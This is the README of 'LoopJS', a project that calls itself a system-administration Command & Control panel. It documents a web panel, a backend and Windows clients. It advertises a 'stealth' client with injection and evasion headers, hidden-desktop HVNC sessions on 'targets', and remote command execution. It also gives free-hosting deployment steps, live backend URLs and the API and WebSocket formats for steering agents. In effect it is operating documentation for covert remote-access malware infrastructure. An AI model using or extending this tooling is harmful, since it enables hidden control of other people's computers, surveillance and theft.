# LoopJS - Command & Control Panel System

[![Deploy Status](https://github.com/your-username/loopjs/workflows/Deploy%20All%20Services/badge.svg)](https://github.com/your-username/loopjs/actions)
[![Production](https://img.shields.io/badge/status-production-green)](https://loopjs.vidai.sbs/)
[![Backend](https://img.shields.io/badge/backend-cloud%20run-blue)](https://loopjs-backend-361659024403.us-central1.run.app)

## 🎯 Overview

LoopJS is a comprehensive Command & Control (C2) panel system designed for system administration and remote management. It consists of a web-based control panel, a Node.js backend API, and multiple client implementations (Qt C++, C#, Stealth).

### 🌐 Production Deployment

**Ready to deploy to production!** This project is configured for **100% FREE deployment** using:
- **Frontend:** Vercel (100GB bandwidth/month)
- **Backend:** Render.com (750 hours/month)
- **Database:** MongoDB Atlas (512MB storage)

**📖 Complete Deployment Guide:** See [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) for step-by-step instructions.

**✅ Quick Deployment Checklist:** See [DEPLOYMENT_CHECKLIST.md](DEPLOYMENT_CHECKLIST.md)

### 🌐 Demo / Production URLs
- **Frontend**: Update after Vercel deployment
- **Backend API**: Update after Render deployment
- **Health Check**: `<your-backend-url>/health`

## 🏗️ Architecture

```
┌─────────────────┐    WebSocket    ┌─────────────────┐    HTTP/API    ┌─────────────────┐
│   Qt Client     │◄──────────────►│   Backend API   │◄──────────────►│   Frontend      │
│   (C++/Qt)      │                 │   (Node.js)     │                 │   (React)       │
└─────────────────┘                 └─────────────────┘                 └─────────────────┘
         │                                   │                                   │
         │                                   │                                   │
         ▼                                   ▼                                   ▼
┌─────────────────┐                 ┌─────────────────┐                 ┌─────────────────┐
│   System Info   │                 │   MongoDB       │                 │   C2 Panel      │
│   Monitoring    │                 │   Database      │                 │   Dashboard     │
└─────────────────┘                 └─────────────────┘                 └─────────────────┘
```

## 🚀 Quick Start

### Development Prerequisites
- **Node.js**: 18+ for backend and frontend
- **MongoDB**: Local instance or MongoDB Atlas (free tier)
- **Qt 6.9.3**: MinGW 64-bit for client (optional)

### Production Prerequisites
- **GitHub Account** (for repository hosting)
- **MongoDB Atlas** (free tier - 512MB)
- **Render.com Account** (free tier - 750 hours/month)
- **Vercel Account** (free tier - 100GB bandwidth/month)

**See [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) for complete production setup!**

### Development Setup

#### Backend Development
```bash
cd backend
npm install
npm run dev  # Port 8080
```

#### Frontend Development
```bash
cd frontend
npm install
npm run dev  # Port 5173
```

#### Client Development
```bash
# Qt Client
cd clients/qt-client
./build-standalone.bat

# C# Client
cd clients/C# Client
dotnet build
```

## 📁 Project Structure

The project is organized into three main sections:

### 🎨 Frontend (`/frontend`)
React/TypeScript C2 Panel - Web-based control interface
- **Source Code**: `/src` - React components, pages, services
- **Configuration**: Build configs, TypeScript configs
- **Deployment**: Dockerfile, nginx config
- **Build Output**: `/dist` - Compiled frontend assets

**Key Features**:
- Modern C2 panel interface
- Real-time client monitoring
- Command execution interface
- System information display
- User management and authentication
- **HVNC (Hidden Virtual Network Computing)**: Remote desktop control with hidden sessions

### ⚙️ Backend (`/backend`)
Node.js/Express API Server with WebSocket support
- **Core**: `index.js`, `package.json` - Main server entry point
- **API**: `/controllers`, `/routes` - REST API endpoints
- **Models**: `/models` - Database schemas (MongoDB)
- **Middleware**: `/middleware` - Authentication, security, validation
- **Services**: `/services` - Business logic services
- **Configuration**: `/configs` - Server configuration files
- **Deployment**: Dockerfile, cloudbuild.yaml, app.yaml

**Key Features**:
- RESTful API endpoints
- WebSocket server for real-time updates
- Client registration and management
- Task execution and monitoring
- Audit logging and security
- **HVNC Support**: Remote desktop control endpoints and WebSocket message routing

### 💻 Clients (`/clients`)
Multiple client implementations for different platforms

#### Qt C++ Client (`/clients/qt-client`)
- **Source**: `.cpp`, `.h` files - Core client implementation
- **Build**: `.bat` scripts, CMakeLists.txt, .pro files
- **Config**: `config.json` - Client configuration

**Key Features**:
- System information gathering
- WebSocket communication
- Command execution
- Self-updating capabilities
- Stealth operation mode
- **HVNC Implementation**: Hidden desktop sessions, screen capture, remote input control

#### C# Client (`/clients/C# Client`)
- **Source**: `Program.cs` - Main client implementation
- **Project**: `.csproj`, `.sln` - Visual Studio project files
- **Config**: `Properties/launchSettings.json`

#### Stealth Client (`/clients/stealth-client`)
- **Headers**: Core injection and evasion headers
- **Minimal**: Lightweight implementation

### 🔧 Shared Resources (`/scripts`)
Deployment and utility scripts
- **Deployment**: `deploy-all.ps1`, `setup-*.ps1`
- **Configuration**: `update-client-config.ps1`
- **Verification**: `verify-deployment.ps1`

## 🔧 Configuration

### Environment Variables
```bash
# Backend
MONGODB_URI=mongodb://localhost:27017/loopjs
JWT_SECRET=your-jwt-secret
SESSION_SECRET=your-session-secret
NODE_ENV=production

# Frontend
VITE_BACKEND_URL=https://loopjs-backend-361659024403.us-central1.run.app
VITE_WS_URL=wss://loopjs-backend-361659024403.us-central1.run.app/ws
```

### Production URLs
- **Frontend**: https://loopjs.vidai.sbs/
- **Backend**: https://loopjs-backend-361659024403.us-central1.run.app
- **WebSocket**: wss://loopjs-backend-361659024403.us-central1.run.app/ws

## 🚀 Deployment

### Automated Deployment (GitHub Actions)
```bash
# Push to main branch triggers deployment
git push origin main
```

### Manual Deployment
```bash
# Deploy backend
gcloud run deploy loopjs-backend --source ./backend --region us-central1

# Deploy frontend
gcloud run deploy loopjs-frontend --source ./frontend --region us-central1
```

### Client Deployment
```bash
# Build standalone client
cd clients/qt-client
.\build-standalone.bat

# Create single executable
.\create-final-single-exe.ps1
```

## 📊 API Documentation

### Authentication
```bash
# Login
POST /api/auth/login
{
  "username": "admin",
  "password": "password"
}

# Response
{
  "status": "success",
  "data": {
    "token": "jwt-token",
    "user": { "id": "user-id", "username": "admin" }
  }
}
```

### Client Management
```bash
# Get all clients
GET /api/info/get-user-list

# Register client
POST /api/info/register-client
{
  "uuid": "client-uuid",
  "computerName": "DESKTOP-ABC123",
  "ipAddress": "192.168.1.100"
}
```

### WebSocket Messages
```javascript
// Client registration
{
  "type": "register",
  "data": {
    "uuid": "client-uuid",
    "computerName": "DESKTOP-ABC123",
    "ipAddress": "192.168.1.100",
    "platform": "windows",
    "capabilities": ["command_execution", "file_transfer"]
  }
}

// Command execution
{
  "type": "command",
  "data": {
    "uuid": "client-uuid",
    "command": "dir C:\\",
    "id": "command-id"
  }
}
```

## 🔐 Security Features

- **JWT Authentication**: Secure token-based authentication
- **CORS Protection**: Configured for specific domains
- **Input Validation**: All inputs sanitized and validated
- **Audit Logging**: Complete activity tracking
- **SSL/TLS**: Encrypted communication
- **Rate Limiting**: API request throttling

## 🐛 Troubleshooting

### Common Issues

#### Client Not Showing in C2 Panel
```bash
# Check API endpoint
curl https://loopjs-backend-361659024403.us-central1.run.app/api/info/get-user-list

# Verify frontend configuration
grep -r "get-user-list" frontend/src/
```

#### WebSocket Connection Failed
```bash
# Test WebSocket connection
wscat -c wss://loopjs-backend-361659024403.us-central1.run.app/ws

# Check CORS configuration
curl -H "Origin: https://loopjs.vidai.sbs" https://loopjs-backend-361659024403.us-central1.run.app/health
```

#### SSL/TLS Issues
```bash
# Include TLS backends in client
copy "C:\Qt\6.9.3\mingw_64\plugins\tls\qschannelbackend.dll" dist\tls\
copy "C:\Qt\6.9.3\mingw_64\plugins\tls\qcertonlybackend.dll" dist\tls\
```

## 📈 Monitoring

### Health Checks
- **Backend**: `GET /health`
- **Frontend**: Root endpoint
- **WebSocket**: Connection test

### Logs
```bash
# Backend logs
gcloud run services logs read loopjs-backend --region us-central1

# Frontend logs
gcloud run services logs read loopjs-frontend --region us-central1
```

### Metrics
- **CPU Usage**: Cloud Run metrics
- **Memory Usage**: Cloud Run metrics
- **Request Count**: Cloud Run metrics
- **Error Rate**: Cloud Run metrics

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests if applicable
5. Submit a pull request

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 📞 Support

- **Documentation**: See `PROJECT_STRUCTURE.md` for detailed project organization
- **Issues**: Report issues on GitHub
- **Discussions**: Use GitHub Discussions for questions

## 🖥️ HVNC (Hidden Virtual Network Computing)

LoopJS includes a complete HVNC implementation for remote desktop control with hidden sessions.

### Features
- **Hidden Desktop Sessions**: Create invisible desktop sessions on Windows targets
- **Real-time Screen Sharing**: Live screen capture with configurable quality (High/Medium/Low)
- **Remote Input Control**: Full mouse and keyboard control over remote desktop
- **Clipboard Synchronization**: Bidirectional clipboard sync between local and remote
- **Adaptive Quality**: Dynamic FPS adjustment (5/15/30 FPS) based on network conditions
- **Platform Support**: Windows (primary), with extensible architecture for other platforms

### Quick Access Guide

**From the C2 Panel:**
1. Navigate to **Dashboard** or **Agents** page
2. Select an **online agent** with HVNC capability
3. Click the **HVNC** button in Quick Actions (purple button with monitor icon)
4. Configure connection settings (Mode, Quality, FPS)
5. Click **Connect** to start the session
6. Interact with the remote desktop using mouse and keyboard
7. Use toolbar controls for clipboard sync, screenshots, and fullscreen mode

### Documentation
- **📖 Complete UI Access Guide**: See [HVNC_UI_ACCESS_GUIDE.md](HVNC_UI_ACCESS_GUIDE.md) for detailed step-by-step instructions
- **🔧 Implementation Details**: See [HVNC_IMPLEMENTATION_SUMMARY.md](HVNC_IMPLEMENTATION_SUMMARY.md) for technical documentation
- **💻 Integration Guide**: See [HVNC_INTEGRATION_EXAMPLE.md](HVNC_INTEGRATION_EXAMPLE.md) for developer integration examples

### API Endpoints
```bash
# Start HVNC session
POST /api/agent/:id/hvnc/start
{
  "quality": "medium",
  "fps": 15,
  "mode": "hidden"
}

# Stop HVNC session
POST /api/agent/:id/hvnc/stop
{
  "sessionId": "session-uuid"
}

# Get session status
GET /api/agent/:id/hvnc/status/:sessionId

# Send HVNC command (mouse/keyboard)
POST /api/agent/:id/hvnc/command
{
  "sessionId": "session-uuid",
  "command": "mouse_move",
  "params": { "x": 100, "y": 200 }
}

# Take screenshot
POST /api/agent/:id/hvnc/screenshot
{
  "sessionId": "session-uuid"
}
```

### WebSocket Messages
```javascript
// Start HVNC (from admin to backend)
{
  "type": "hvnc_start",
  "agentId": "client-uuid",
  "settings": {
    "quality": "medium",
    "fps": 15,
    "mode": "hidden"
  }
}

// HVNC Frame (from client to admin)
{
  "type": "hvnc_frame",
  "agentUuid": "client-uuid",
  "frameData": "base64-encoded-jpeg",
  "frameInfo": {
    "width": 1920,
    "height": 1080,
    "timestamp": 1234567890
  }
}

// HVNC Command (from admin to client)
{
  "type": "hvnc_command",
  "targetId": "client-uuid",
  "sessionId": "session-uuid",
  "command": "mouse_move",
  "params": { "x": 100, "y": 200 }
}
```

## 🎯 Roadmap

- [x] HVNC (Hidden Virtual Network Computing) - ✅ Completed
- [ ] Enhanced client capabilities
- [ ] Mobile client support
- [ ] Advanced monitoring features
- [ ] Plugin system
- [ ] Multi-tenant support
- [ ] Advanced security features

---

**Status**: Production Ready ✅  
**Version**: 1.0.0  
**Last Updated**: October 1, 2025